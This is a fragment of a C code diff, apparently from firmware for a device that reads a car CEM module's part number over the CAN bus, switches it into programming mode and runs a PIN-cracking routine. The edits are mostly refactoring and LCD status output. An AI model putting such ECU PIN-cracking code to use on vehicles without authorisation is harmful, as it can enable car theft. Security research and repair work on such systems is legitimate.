+  progModeOn ();
+  pn = ecu_read_part_number_prog (CAN_HS, CEM_HS_ECU_ID);
 #endif
 
-  struct _cem_params hs_params;
-  if (!pn || !find_cem_params(pn, &hs_params)) {
-    printf("Unknown CEM part number %lu. Don't know what to do.\n", pn);
+  struct _cem_params *p_hs_params;
+
+  if (!pn || ((p_hs_params = find_cem_params (pn)) == NULL)) {
+    printf ("Unknown CEM part number %u. Don't know what to do.\n", pn);
+    lcd_printf (0, 0, "Unknown CEM     ");
+    lcd_printf (0, 1, "Exiting......   ");
     return;
   }
 
-  shuffle_order = shuffle_orders[hs_params.shuffle];
-  printf("CAN HS baud rate: %d\n", hs_params.baud);
-  printf("PIN shuffle order: %d %d %d %d %d %d\n", shuffle_order[0], shuffle_order[1], shuffle_order[2], shuffle_order[3], shuffle_order[4], shuffle_order[5]);
+  lcd.clear ();
+  lcd_printf (0, 0, "CEM: %lu", pn);
+
+  shuffle_order = shuffle_orders[p_hs_params->shuffle];
+
+  printf ("CAN HS baud rate: %d\n", p_hs_params->baud);
+  printf ("PIN shuffle order: %d %d %d %d %d %d\n",
+          shuffle_order[0], shuffle_order[1], shuffle_order[2],
+	  shuffle_order[3], shuffle_order[4], shuffle_order[5]);
 
 #if defined(CEM_PN_AUTODETECT)
   if (!hs_inited)
-    can_hs_init(hs_params.baud);
+    can_hs_init (p_hs_params->baud);
 
-  can_prog_mode();
+  lcd_printf (0, 1, "Enter PROG mode.");
+
+  progModeOn ();
   if (!hs_inited)
-      pn = ecu_read_part_number_prog(CAN_HS, CEM_HS_ECU_ID);
+      pn = ecu_read_part_number_prog (CAN_HS, CEM_HS_ECU_ID);
 #endif
 
   initialized = true;
@@ -1064,7 +1352,7 @@ void loop (void)
   bool verbose = false;
 
   if (initialized)
-    cemCrackPin (CALC_BYTES, verbose);
+    cemCrackPin (calc_bytes, verbose);
 
   /* exit ECU programming mode */
 
